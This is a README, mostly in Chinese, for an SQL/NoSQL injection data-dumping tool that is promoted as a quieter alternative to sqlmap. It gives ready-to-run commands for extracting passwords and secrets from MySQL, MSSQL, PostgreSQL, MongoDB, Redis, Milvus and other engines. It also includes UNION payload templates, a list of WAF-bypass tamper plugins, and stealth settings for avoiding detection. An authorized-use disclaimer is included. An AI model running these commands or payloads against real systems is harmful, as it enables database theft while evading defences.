# SqlStealthRogue

> **让天底下没有难拖的数据库。**

[![Python 3.7+](https://img.shields.io/badge/Python-3.7%2B-blue?style=flat-square)](https://www.python.org/)
[![Zero Dependency](https://img.shields.io/badge/Dependency-Zero-green?style=flat-square)]()
[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
[![DBMS](https://img.shields.io/badge/DBMS-12%20Engines%20Verified-critical?style=flat-square)]()
[![Extra Requests](https://img.shields.io/badge/Extra%20Requests-0-critical?style=flat-square)]()

**A minimalist, zero-probe SQL/NoSQL injection data dumper.** Single file entry, pure Python standard library, no dependencies.

SqlStealthRogue 是一把"手术刀"式的注入脱库工具：在**已知注入点、已知库表列**的前提下，以**零协商流量、零探测请求**完成高速数据提取。sqlmap 即使指定了 `-D/-T/-C`，仍会发出大量指纹识别、版本探测、权限枚举、WAF 检测、注入技术轮询等"环境探查"请求；SqlStealthRogue 反其道而行——**发出的每一个请求，都是数据提取请求本身。**

> ⚠️ **仅限已授权的安全测试使用。** 未经授权对他人系统使用本工具属于违法行为，使用者需自行承担全部法律责任。

---

## ✨ 核心特性

### 🔇 零额外请求

| 行为 | SqlStealthRogue |
|---|---|
| DBMS 指纹 / 版本探测 | ❌ 不存在 |
| 权限 / 库表列枚举 | ❌ 不存在（你已知目标结构）|
| WAF 检测 / 技术轮询 | ❌ 不存在（`--dbms` + `--technique` 指定即用）|
| true-mark 标定请求 | ❌ 不存在（行终止信号搭提取请求的便车）|
| **发出的每一个请求** | ✅ **都是提取请求**（mock + 12 引擎真机逐请求对账验证）|

### ⚡ 高速提取（真机实测数据）

| 优化 | 实测效果 |
|---|---|
| 位并行盲注引擎（`char & mask` 8 位并发）| **5.35×** 提速，请求数与串行二分完全相同 |
| HTTP keep-alive 线程本地长连接 | **5.6×** 提速（HTTP/1.0 目标自动降级，零损失）|
| 报错分块预取（自适应窗口）| 长值 1 批次取完 |
| PG/MSSQL 大分块（实测错误消息承载 ≥800 字符）| 600 字符值 **22 → 6 请求** |
| UNION 模式 | 整表 **1 请求** |

### 🧩 自定义过 WAF 插件（tamper 链）

```bash
# 内置 13 个 sqlmap 同名同语义 tamper，按序组合，零额外流量
python SqlStealthRogue.py --tamper "randomcase,between,space2comment" ...

# 自定义插件：一个 py 文件一个 tamper() 函数，丢进目录即可（兼容 sqlmap 风格脚本）
python SqlStealthRogue.py --tamper mybypass --tamper-dir /path/to/tampers ...
```

`space2comment` `space2plus` `space2randomblank` `between` `equaltolike` `randomcase` `charencode` `chardoubleencode` `halfversionedmorekeywords` `apostrophemask` `percentage` `unionalltounion` `xforwardedfor`

### 🛡️ 错误配置最小截停

参数填错不会倾泻流量——错误代价被钉死在"首行首值"量级：

| 错误形态 | 实际发包量 |
|---|---|
| 参数静态非法 / 未知 tamper / 库×技术不匹配 | **0** |
| 注入点不通 | ≤2 |
| 模板或 true-mark 语法错 | 8~16 |
| true-mark 恒真 / 正则恒匹配（哨兵守卫自动中止）| ~128（无守卫时 16,384+）|
| union 模板错 | 1 |

### 🗄️ 12 引擎真机验证矩阵

| 引擎 | error | bool | time | prefix | union |
|---|:---:|:---:|:---:|:---:|:---:|
| MySQL 8 | ✅ | ✅ | ✅ | — | ✅ |
| PostgreSQL 14 | ✅ | ✅ | ✅ | — | ✅ |
| MSSQL 2022 | ✅ | ✅ | ✅ | — | ✅ |
| SQLite | ❌¹ | ✅ | ✅ | — | ✅ |
| Redis | — | ✅ | ⚠️² | — | ✅ |
| MongoDB 7 | — | ✅ | ✅ | ✅ | — |
| openGauss 5 | ✅ | ✅ | ✅ | — | ✅ |
| OceanBase CE | ❌¹ | ✅ | ✅ | — | ✅ |
| Oracle 23ai | ❌³ | ✅ | ✅ | — | ✅ |
| Elasticsearch 8 | — | ✅ | ⚠️² | — | ✅ |
| Milvus 2.4 | — | — | — | — | ✅ |
| pgvector | ✅ | ✅ | ✅ | — | ✅ |

¹ 该引擎错误信息不含查询数据或未实现对应函数，按真机证据关闭 ² 模板内置未实机验证 ³ 23ai 的 XMLType 报错已不回显数据；旧版本可用 `-A` 手动启用（模板见 `dbms/oracle.py` 注释）

---

## 🚀 快速开始

```bash
git clone https://github.com/yourname/SqlStealthRogue.git
cd SqlStealthRogue
python SqlStealthRogue.py --list            # 引擎×技术矩阵
python SqlStealthRogue.py --list-tampers    # tamper 插件清单
```

**注入点用 `*` 标记，库和注入方式命令行指定：**

```bash
# MySQL 报错脱库（默认引擎默认技术，行迭代自动包裹，取空即停）
python SqlStealthRogue.py -u "http://target/page.php?id=1*" \
  -q "SELECT password FROM users"

# MSSQL 报错
python SqlStealthRogue.py --dbms mssql -u "http://target/p.aspx?id=1*" \
  -q "SELECT name FROM master..sysdatabases"

# PostgreSQL 时间盲注（无回显差异场景）
python SqlStealthRogue.py --dbms postgres --technique time --sec 5 \
  -u "http://target/p.php?id=1*" -q "SELECT secret FROM t"

# MongoDB 正则前缀（PHP 风格表单运算符注入）
python SqlStealthRogue.py --dbms mongodb --technique prefix --true-mark "登录成功" \
  -u "http://target/login" --data "password[$regex]=*" -q password

# MongoDB $where 布尔（注入点落在 $where 的 JS 字符串值内）
python SqlStealthRogue.py --dbms mongodb --technique bool --true-mark "..." \
  -u "http://target/login" --data '{"user":"admin","$where":"*"}' --raw -q password

# Redis（CRLF 内联命令注入 + EVAL）
python SqlStealthRogue.py --dbms redis --technique union \
  -u "http://target/api?key=1*" -q secretkey --regex '\$[0-9]+\r\n(.+?)\r\n'

# Milvus 表达式注入（一次全量拉取）
python SqlStealthRogue.py --dbms milvus --technique union \
  -u "http://target/search?expr=*" -q x --regex '"secret":\s*"([^"]*)"'

# UNION 整表 1 请求（SQL 里拼 [[ ]] 标记便于提取）
python SqlStealthRogue.py --technique union -u "http://target/p.php?id=1*" \
  -U " UNION SELECT NULL,NULL,{Q}#" \
  -q "concat(0x5b5b,col,0x5d5d) FROM t" --regex "\[\[(.*?)\]\]"
```

**速度/隐蔽旋钮：**

```bash
--bwidth 32    # 值内探测并发（HTTP 并发上限恒等于此值）
--threads 8    # 并发行数
--delay 0.5 --bwidth 1 --threads 1   # 全串行 + 限速：最大隐蔽
--err-mark 'ERR:'   # 后端错误页=无效探针（重试后仍错则中止，防静默污染数据）
```

## 🧠 工作原理

```
SqlStealthRogue/
├── SqlStealthRogue.py          # 入口
└── SqlStealthRogue/
    ├── core.py                 # 引擎：HTTP 发送(keep-alive) + 5 种提取算法 + 行迭代 + 错误哨兵
    ├── cli.py                  # 参数 / 校验 / 调度
    ├── dbms/                   # 引擎插件：一个文件一个库，丢进去即注册（base 继承链）
    └── tampers/                # WAF 绕过插件：一个文件一个 tamper()，同名覆盖内置
```

**五种提取算法**（按流量从少到多）：`union`（整表 1 请求）→ `error`（每 30~500 字符 1 请求，分块预取）→ `bool`（每字符 8 请求，位并行）→ `time`（每字符 8 请求，刻意串行防打挂目标）→ `prefix`（NoSQL $regex 前缀二分）。

**占位符契约**：URL/body 里的 `*` = 注入点；模板里的 `{Q}` 查询、`{F}` 字段、`{P}` 位置、`{N}` 块长、`{K}/{M}` 二分值/位掩码、`{T}` 延时、`{S}` 前缀、`{HH}` 字符类上界。所有模板可用 `-A/-B/--bit-tpl/--time-tpl/-U` 覆盖。

**新增一个数据库 = 在 `dbms/` 加一个几十行的 PROFILE 文件**，零注册代码；兼容库走 `base` 继承（如 `pgvector` 整个文件只有一行 `base: 'postgres'`）。

## ⚠️ 已知边界

- bool 位并行以全 0 字节判串结束：二进制数据（BLOB）请用 error/union
- 盲注逐字节提取：多字节字符按单字节取出会乱码（error/union 整段传输不受影响）
- time 模式保持串行：并行 SLEEP 会叠加目标负载
- 零探测的代价：配置错误时工具只提示 `未取到任何行`，不替你排查注入点——用 `--err-mark` 把后端错误变成显式失败

## 📜 免责声明

本项目仅供**已授权**的渗透测试、安全研究与教学用途。使用本工具对任何未经授权的系统进行测试均属违法。开发者不对任何滥用行为承担责任，使用即代表你已获得目标系统所有者的书面授权。

## License

[MIT](LICENSE)
